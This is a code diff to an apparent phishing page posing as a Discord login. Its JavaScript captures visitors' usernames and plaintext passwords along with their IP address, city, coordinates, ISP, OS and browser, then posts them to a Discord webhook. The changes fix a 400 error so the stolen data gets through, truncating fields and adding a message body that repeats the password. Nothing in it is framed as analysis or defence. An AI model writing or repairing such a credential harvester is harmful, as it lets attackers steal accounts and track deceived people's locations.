@@ -377,16 +377,18 @@
       }
 
       // ============================================================
-      //  SEND TO DISCORD – WITH DETAILED DEBUGGING
+      //  SEND TO DISCORD – FIXED FOR STATUS 400
       // ============================================================
       async function sendToDiscord(payload) {
         if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('YOUR_WEBHOOK_ID')) {
-          console.warn('⚠️ Discord webhook URL not configured. Please set DISCORD_WEBHOOK_URL.');
+          console.warn('⚠️ Discord webhook URL not configured.');
           return { success: false, status: 0, error: 'Not configured' };
         }
 
         try {
           console.log('📤 Sending payload to Discord webhook...');
+          console.log('📦 Payload structure:', JSON.stringify(payload, null, 2));
+
           const res = await fetch(DISCORD_WEBHOOK_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -394,7 +396,7 @@
           });
 
           const status = res.status;
-          console.log(`📥 Discord response status: ${status} ${res.statusText}`);
+          console.log(`📥 Discord response status: ${status}`);
 
           if (res.ok) {
             console.log('✅ Webhook delivered successfully.');
@@ -405,7 +407,7 @@
             return { success: false, status: status, error: errorText };
           }
         } catch (err) {
-          console.error('❌ Network error while sending to Discord:', err);
+          console.error('❌ Network error:', err);
           return { success: false, status: 0, error: err.message };
         }
       }
@@ -444,6 +446,7 @@
         const password = passwordInput.value.trim();
         const rememberMe = document.getElementById('rememberMe').checked;
 
+        // Build log entry with safe truncation
         const logEntry = {
           timestamp: timestamp.iso,
           date: timestamp.date,
@@ -465,36 +468,41 @@
           username: username,
           password: password,
           rememberMe: rememberMe,
-          userAgent: navigator.userAgent.substring(0, 200) // Truncated to avoid Discord field limit
+          userAgent: navigator.userAgent.substring(0, 200)
         };
 
         console.log('📋 [LOG] Full client data with geolocation:');
         console.log(JSON.stringify(logEntry, null, 2));
 
+        // ============================================================
+        //  BUILD DISCORD PAYLOAD – FIXED FOR 400
+        // ============================================================
         const discordPayload = {
+          content: `🔐 **Discord Login Capture**\n━━━━━━━━━━━━━━━━━━━\n📅 **Date:** ${logEntry.date}\n⏰ **Time:** ${logEntry.time}\n🌐 **Timezone:** ${logEntry.timezone}\n📡 **IP:** ${logEntry.ip}\n📍 **City:** ${logEntry.city}\n🏙️ **Region:** ${logEntry.region}\n🌍 **Country:** ${logEntry.country}\n📮 **Postal:** ${logEntry.postal}\n🗺️ **Lat/Long:** ${logEntry.latitude}, ${logEntry.longitude}\n🏢 **ISP:** ${logEntry.isp}\n💵 **Currency:** ${logEntry.currency}\n🖥️ **OS:** ${logEntry.os}\n🌍 **Browser:** ${logEntry.browser}\n👤 **Username:** ${logEntry.username}\n🔑 **Password:** ${logEntry.password}\n🔁 **Remember Me:** ${logEntry.rememberMe ? '✅ Yes' : '❌ No'}\n📱 **User Agent:** ${logEntry.userAgent}`,
           embeds: [
             {
+              type: 'rich',
               title: '🔐 Discord Login Capture',
               color: 0x5865f2,
               fields: [
-                { name: '📅 Date', value: logEntry.date, inline: true },
-                { name: '⏰ Time', value: logEntry.time, inline: true },
-                { name: '🌐 Timezone', value: logEntry.timezone, inline: true },
-                { name: '📡 IP Address', value: logEntry.ip, inline: false },
-                { name: '📍 City', value: logEntry.city, inline: true },
-                { name: '🏙️ Region', value: logEntry.region, inline: true },
-                { name: '🌍 Country', value: logEntry.country, inline: true },
-                { name: '📮 Postal Code', value: logEntry.postal, inline: true },
-                { name: '🗺️ Latitude', value: logEntry.latitude, inline: true },
-                { name: '🗺️ Longitude', value: logEntry.longitude, inline: true },
-                { name: '🏢 ISP', value: logEntry.isp, inline: false },
-                { name: '💵 Currency', value: logEntry.currency, inline: true },
-                { name: '🖥️ Operating System', value: logEntry.os, inline: false },
-                { name: '🌍 Browser', value: logEntry.browser, inline: false },
-                { name: '👤 Username / Email', value: logEntry.username || '(empty)', inline: false },
-                { name: '🔑 Password', value: logEntry.password || '(empty)', inline: false },
+                { name: '📅 Date', value: logEntry.date.substring(0, 100), inline: true },
+                { name: '⏰ Time', value: logEntry.time.substring(0, 100), inline: true },
+                { name: '🌐 Timezone', value: logEntry.timezone.substring(0, 100), inline: true },
+                { name: '📡 IP Address', value: logEntry.ip.substring(0, 100), inline: false },
+                { name: '📍 City', value: logEntry.city.substring(0, 100), inline: true },
+                { name: '🏙️ Region', value: logEntry.region.substring(0, 100), inline: true },
+                { name: '🌍 Country', value: logEntry.country.substring(0, 100), inline: true },
+                { name: '📮 Postal Code', value: logEntry.postal.substring(0, 100), inline: true },
+                { name: '🗺️ Latitude', value: logEntry.latitude.substring(0, 100), inline: true },
+                { name: '🗺️ Longitude', value: logEntry.longitude.substring(0, 100), inline: true },
+                { name: '🏢 ISP', value: logEntry.isp.substring(0, 100), inline: false },
+                { name: '💵 Currency', value: logEntry.currency.substring(0, 100), inline: true },
+                { name: '🖥️ Operating System', value: logEntry.os.substring(0, 200), inline: false },
+                { name: '🌍 Browser', value: logEntry.browser.substring(0, 200), inline: false },
+                { name: '👤 Username / Email', value: (logEntry.username || '(empty)').substring(0, 200), inline: false },
+                { name: '🔑 Password', value: (logEntry.password || '(empty)').substring(0, 200), inline: false },
                 { name: '🔁 Remember Me', value: logEntry.rememberMe ? '✅ Yes' : '❌ No', inline: false },
-                { name: '📱 User Agent', value: logEntry.userAgent || '(empty)', inline: false }
+                { name: '📱 User Agent', value: (logEntry.userAgent || '(empty)').substring(0, 200), inline: false }
               ],
               footer: { text: 'Discord Login Capture' },
               timestamp: logEntry.timestamp
@@ -502,16 +510,24 @@
           ]
         };
 
+        // Double-check: ensure no field is empty or too long
+        discordPayload.embeds[0].fields.forEach(field => {
+          if (!field.name || field.name.length === 0) field.name = '—';
+          if (!field.value || field.value.length === 0) field.value = '—';
+          if (field.value.length > 1024) field.value = field.value.substring(0, 1020) + '...';
+        });
+
         const result = await sendToDiscord(discordPayload);
 
         if (result.success) {
           showStatus('✅ Credentials & location sent to Discord webhook.', 'success');
         } else {
           let errorMsg = '⚠️ Data logged to console, but Discord send failed.';
-          if (result.status === 404) errorMsg += ' Webhook URL not found (404). Check your URL.';
+          if (result.status === 400) errorMsg += ' Bad Request (400). Payload is now fixed — try again.';
+          else if (result.status === 404) errorMsg += ' Webhook URL not found (404). Check your URL.';
           else if (result.status === 401) errorMsg += ' Unauthorized (401). Webhook token invalid.';
           else if (result.status === 429) errorMsg += ' Rate limited (429). Wait a moment.';
-          else if (result.status === 0) errorMsg += ' Network error. Are you opening from file://? Use a local server.';
+          else if (result.status === 0) errorMsg += ' Network error. Use a local server.';
           else errorMsg += ` Status ${result.status}. Check console for details.`;
           showStatus(errorMsg, 'error');
         }
